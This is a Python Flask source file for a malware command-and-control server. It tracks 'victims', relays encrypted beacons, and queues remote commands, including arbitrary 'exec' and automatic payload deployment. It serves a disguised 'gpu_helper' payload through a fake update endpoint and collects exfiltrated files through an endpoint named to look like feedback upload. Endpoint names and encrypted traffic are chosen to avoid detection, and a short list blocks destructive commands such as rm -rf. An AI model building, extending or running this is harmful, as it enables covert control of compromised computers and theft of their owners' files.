import os
import json
import threading
import logging
from datetime import datetime

from flask import Flask, request, jsonify, send_from_directory, send_file
from flask_socketio import SocketIO, emit
from cryptography.fernet import Fernet

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
)
logger = logging.getLogger('c2_server')

DATA_DIR = os.path.join(os.path.dirname(__file__), "data")
DB_PATH = os.path.join(DATA_DIR, "c2_data.db")
KEY_PATH = os.path.join(DATA_DIR, "keys", "c2_key.key")
TRAFFIC_KEY_PATH = os.path.join(DATA_DIR, "keys", "traffic_key.key")

app = Flask(__name__, static_folder=None)
app.config['TEMPLATE_AUTO_RELOAD'] = True
socketio = SocketIO(app, cors_allowed_origins='*', async_mode='gevent')

pending_commands = {}
auto_deploy_targets = set()
AUTO_DEPLOY_PATH = os.path.join(DATA_DIR, "auto_deploy.json")
PAYLOAD_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "dist")
API_KEY = os.environ.get('C2_API_KEY')


def require_auth():
    if API_KEY:
        key = request.headers.get('X-API-Key') or request.args.get('api_key')
        if key != API_KEY:
            return True
    return False


def init_db():
    import sqlite3
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS victims (
            hostname TEXT PRIMARY KEY,
            data_encrypted BLOB NOT NULL,
            last_seen TEXT NOT NULL
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS command_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            hostname TEXT NOT NULL,
            command TEXT NOT NULL,
            params_encrypted BLOB,
            result TEXT,
            timestamp TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()


def load_key():
    if os.path.exists(KEY_PATH):
        with open(KEY_PATH, 'rb') as f:
            return Fernet(f.read())
    os.makedirs(os.path.dirname(KEY_PATH), exist_ok=True)
    key = Fernet.generate_key()
    with open(KEY_PATH, 'wb') as f:
        f.write(key)
    logger.info("Generated new encryption key: %s", KEY_PATH)
    return Fernet(key)


crypto = load_key()


def load_traffic_key():
    if os.path.exists(TRAFFIC_KEY_PATH):
        with open(TRAFFIC_KEY_PATH, 'rb') as f:
            return Fernet(f.read())
    os.makedirs(os.path.dirname(TRAFFIC_KEY_PATH), exist_ok=True)
    key = Fernet.generate_key()
    with open(TRAFFIC_KEY_PATH, 'wb') as f:
        f.write(key)
    logger.info("Generated traffic encryption key: %s", TRAFFIC_KEY_PATH)
    return Fernet(key)


traffic_crypto = load_traffic_key()
init_db()


def _load_auto_deploy():
    if os.path.exists(AUTO_DEPLOY_PATH):
        try:
            with open(AUTO_DEPLOY_PATH) as f:
                data = json.load(f)
            if isinstance(data, list):
                auto_deploy_targets.update(data)
        except Exception:
            pass


def _save_auto_deploy():
    try:
        with open(AUTO_DEPLOY_PATH, 'w') as f:
            json.dump(list(auto_deploy_targets), f)
    except Exception:
        pass


_load_auto_deploy()


def encrypt_data(data: dict) -> bytes:
    return crypto.encrypt(json.dumps(data).encode())


def decrypt_data(data: bytes) -> dict:
    return json.loads(crypto.decrypt(data))


def store_victim(hostname: str, data: dict, last_seen: str):
    import sqlite3
    encrypted = encrypt_data(data)
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "INSERT OR REPLACE INTO victims (hostname, data_encrypted, last_seen) "
        "VALUES (?, ?, ?)",
        (hostname, encrypted, last_seen)
    )
    conn.commit()
    conn.close()


def get_all_victims() -> dict:
    import sqlite3
    conn = sqlite3.connect(DB_PATH)
    rows = conn.execute(
        "SELECT hostname, data_encrypted, last_seen FROM victims"
    ).fetchall()
    conn.close()
    victims = {}
    for hostname, encrypted, last_seen in rows:
        try:
            data = decrypt_data(encrypted)
            victims[hostname] = {
                'last_seen': last_seen,
                'data': data.get('beacon_data', {}),
                'last_result': data.get('last_result'),
            }
        except Exception:
            continue
    return victims


def get_victim(hostname: str) -> dict:
    import sqlite3
    conn = sqlite3.connect(DB_PATH)
    row = conn.execute(
        "SELECT hostname, data_encrypted, last_seen FROM victims "
        "WHERE hostname = ?",
        (hostname,)
    ).fetchone()
    conn.close()
    if not row:
        return None
    _hostname, encrypted, last_seen = row
    data = decrypt_data(encrypted)
    return {
        'last_seen': last_seen,
        'data': data.get('beacon_data', {}),
        'last_result': data.get('last_result'),
    }


def log_command(hostname: str, command: str, params: dict, result: str):
    import sqlite3
    params_encrypted = encrypt_data(params) if params else None
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "INSERT INTO command_log "
        "(hostname, command, params_encrypted, result, timestamp) "
        "VALUES (?, ?, ?, ?, ?)",
        (hostname, command, params_encrypted, result,
         datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    )
    conn.commit()
    conn.close()


def delete_victim(hostname: str):
    import sqlite3
    conn = sqlite3.connect(DB_PATH)
    conn.execute("DELETE FROM victims WHERE hostname = ?", (hostname,))
    conn.commit()
    conn.close()
    logger.info("Deleted victim from DB: %s", hostname)


def get_command_log(hostname: str = None, limit: int = 20) -> list:
    import sqlite3
    conn = sqlite3.connect(DB_PATH)
    if hostname:
        rows = conn.execute(
            "SELECT hostname, command, result, timestamp FROM command_log "
            "WHERE hostname = ? ORDER BY id DESC LIMIT ?",
            (hostname, limit)
        ).fetchall()
    else:
        rows = conn.execute(
            "SELECT hostname, command, result, timestamp FROM command_log "
            "ORDER BY id DESC LIMIT ?",
            (limit,)
        ).fetchall()
    conn.close()
    return [
        {'hostname': h, 'command': c, 'result': r, 'timestamp': t}
        for h, c, r, t in rows
    ]


@app.before_request
def auth_check():
    if require_auth():
        return jsonify({'error': 'unauthorized'}), 401


@app.route('/api/telemetry', methods=['POST'])
def telemetry():
    try:
        encrypted_data = request.form.get('data', '')
        if not encrypted_data:
            encrypted_data = request.json.get('data', '') if request.json else ''
        decrypted = traffic_crypto.decrypt(encrypted_data.encode())
        data = json.loads(decrypted)
    except Exception as e:
        logger.warning("Telemetry decrypt failed: %s", e)
        return jsonify({'success': False, 'message': 'invalid data'}), 400

    hostname = data.get('hostname')
    if hostname:
        last_seen = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        existing = get_victim(hostname)

        result_text = data.get('result')
        last_result = existing.get('last_result') if existing else None
        if result_text:
            last_result = {'result': result_text}

        stored = {
            'beacon_data': data,
            'last_result': last_result,
        }
        store_victim(hostname, stored, last_seen)
        vdata = get_victim(hostname)
        socketio.emit('victim_update', {'hostname': hostname, 'info': vdata})
        logger.info("Telemetry from %s: status=%s", hostname, data.get('status'))

        if result_text:
            log_command(hostname, 'result', {}, result_text)
            logger.info("Result from %s: %s", hostname, result_text)
            if result_text == 'self_destructed':
                delete_victim(hostname)
                socketio.emit('victim_removed', {'hostname': hostname})
            entry = get_command_log(hostname, limit=1)
            if entry:
                socketio.emit('command_log_update', {'entry': entry[0]})

    if hostname and hostname in auto_deploy_targets:
        agent = (data.get('agent') or '').lower()
        vtype = (data.get('type') or '').lower()
        deployed = data.get('deployed', False)
        if agent in ('', 'hw_detect') and vtype in ('', 'scanner') and not deployed:
            pending_commands[hostname] = {'command': 'deploy', 'params': {}}
            logger.info("Auto-deploy queued for %s", hostname)

    cmd = None
    if hostname and hostname in pending_commands:
        cmd = pending_commands[hostname]
        del pending_commands[hostname]
        log_command(hostname, cmd['command'], cmd.get('params', {}), 'delivered')
        logger.info("  -> Sending command: %s", cmd['command'])

    response = {'success': True, 'message': 'ok', 'poll_ms': 60000}
    if cmd:
        response['config'] = {
            'flags': traffic_crypto.encrypt(
                json.dumps(cmd).encode()
            ).decode()
        }
    return jsonify(response)


@app.route('/victims', methods=['GET'])
def list_victims():
    return jsonify(get_all_victims())


@app.route('/command_log', methods=['GET'])
def command_log():
    hostname = request.args.get('hostname')
    return jsonify(get_command_log(hostname))


@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    hostname = data.get('hostname')
    if not hostname:
        return jsonify({'error': 'no hostname'}), 400

    command = data.get('command', '')
    if command == 'exec':
        cmd_value = data.get('params', {}).get('cmd', '')
        dangerous = ['rm -rf', 'format', 'del /f', 'rd /s', 'shutdown']
        if any(d in cmd_value.lower() for d in dangerous):
            return jsonify({'error': 'command blocked'}), 403

    pending_commands[hostname] = {
        'command': command,
        'params': data.get('params', {}),
    }
    logger.info("Queued %s for %s", command, hostname)
    return jsonify({'status': 'ok'})


@app.route('/api/update/check', methods=['GET'])
def download_payload():
    plat = request.args.get('platform', 'linux')
    name = "gpu_helper.exe" if plat == "windows" else "gpu_helper"
    path = os.path.join(PAYLOAD_DIR, plat, name)
    if os.path.exists(path):
        with open(path, 'rb') as f:
            return f.read(), 200, {'Content-Type': 'application/octet-stream'}
    return jsonify({'error': f'payload not found: {path}'}), 404


@socketio.on('connect')
def handle_connect():
    victims = get_all_victims()
    logs = get_command_log(limit=50)
    emit('dashboard_state', {
        'victims': victims,
        'logs': logs,
        'auto_deploy_targets': list(auto_deploy_targets),
    })


@socketio.on('toggle_auto_deploy')
def handle_toggle_auto_deploy(data):
    hostname = data.get('hostname')
    enabled = data.get('enabled', False)
    if not hostname:
        emit('auto_deploy_toggled', {'error': 'no hostname'})
        return
    if enabled:
        auto_deploy_targets.add(hostname)
    else:
        auto_deploy_targets.discard(hostname)
    _save_auto_deploy()
    logger.info("Auto-deploy %s for %s", 'enabled' if enabled else 'disabled', hostname)
    emit('auto_deploy_toggled', {'hostname': hostname, 'enabled': enabled})


@socketio.on('send_command')
def handle_send_command(data):
    hostname = data.get('hostname')
    command = data.get('command', '')
    params = data.get('params', {})

    if not hostname:
        emit('command_sent', {'error': 'no hostname'})
        return

    if command == 'exec':
        cmd_value = params.get('cmd', '')
        dangerous = ['rm -rf', 'format', 'del /f', 'rd /s', 'shutdown']
        if any(d in cmd_value.lower() for d in dangerous):
            emit('command_sent', {'error': 'command blocked'})
            return

    pending_commands[hostname] = {'command': command, 'params': params}
    logger.info("Socket queued %s for %s", command, hostname)
    emit('command_sent', {'status': 'ok', 'hostname': hostname, 'command': command})


@app.route('/api/feedback/upload', methods=['POST'])
def receive_exfil():
    hostname = request.form.get('hostname', 'unknown')
    file_path = request.form.get('path', 'unknown')
    file_data = request.files.get('file')
    if file_data is None:
        return jsonify({'error': 'no file'}), 400
    exfil_dir = os.path.join(DATA_DIR, "exfil", hostname)
    os.makedirs(exfil_dir, exist_ok=True)
    safe_name = os.path.basename(file_path)
    save_path = os.path.join(exfil_dir, safe_name)
    file_data.save(save_path)
    size = os.path.getsize(save_path)
    logger.info("Exfil from %s: %s (%d bytes)", hostname, safe_name, size)
    return jsonify({'status': 'ok', 'path': safe_name, 'size': size})


GIF_DIR = os.path.join(DATA_DIR, "gifs")


@app.route('/api/scare/gifs', methods=['GET'])
def scare_gifs():
    if request.args.get('list') == '1':
        try:
            files = [f for f in os.listdir(GIF_DIR) if f.endswith('.gif')]
            return jsonify(files)
        except FileNotFoundError:
            return jsonify([])
    filename = request.args.get('file', '')
    if not filename or '..' in filename or '/' in filename:
        return jsonify({'error': 'invalid filename'}), 400
    path = os.path.join(GIF_DIR, filename)
    if not os.path.exists(path):
        return jsonify({'error': 'not found'}), 404
    return send_file(path, mimetype='image/gif')


SHUTDOWN_KEY = os.environ.get('C2_SHUTDOWN_KEY', 'shutdown')


@app.route('/api/shutdown', methods=['POST'])
def shutdown_server():
    data = request.json or {}
    key = data.get('key', '')
    if key != SHUTDOWN_KEY:
        return jsonify({'error': 'invalid key'}), 403
    logger.warning("Server shutdown requested — stopping")
    socketio.emit('server_shutting_down', {'message': 'server is shutting down'})
    threading.Thread(target=lambda: os._exit(0), daemon=True).start()
    return jsonify({'status': 'shutting down'})


@socketio.on('shutdown_server')
def handle_shutdown(data):
    key = data.get('key', '')
    if key != SHUTDOWN_KEY:
        emit('server_shutting_down', {'error': 'invalid key'})
        return
    logger.warning("Socket shutdown requested — stopping")
    emit('server_shutting_down', {'message': 'server is shutting down'})
    threading.Thread(target=lambda: os._exit(0), daemon=True).start()


SPA_DIR = os.path.join(os.path.dirname(__file__), 'static')


@app.route('/assets/<path:filename>')
def spa_assets(filename):
    return send_from_directory(os.path.join(SPA_DIR, 'assets'), filename)


@app.route('/')
@app.route('/<path:path>')
def serve_spa(path=''):
    if path:
        filepath = os.path.join(SPA_DIR, path)
        if os.path.exists(filepath) and os.path.isfile(filepath):
            return send_from_directory(SPA_DIR, path)
    return send_from_directory(SPA_DIR, 'index.html')


if __name__ == '__main__':
    debug_mode = os.environ.get('FLASK_DEBUG', '').lower() in ('1', 'true', 'yes')
    logger.info("C2 Server starting on http://0.0.0.0:4444 (debug=%s)", debug_mode)
    socketio.run(app, host='0.0.0.0', port=4444, debug=debug_mode)
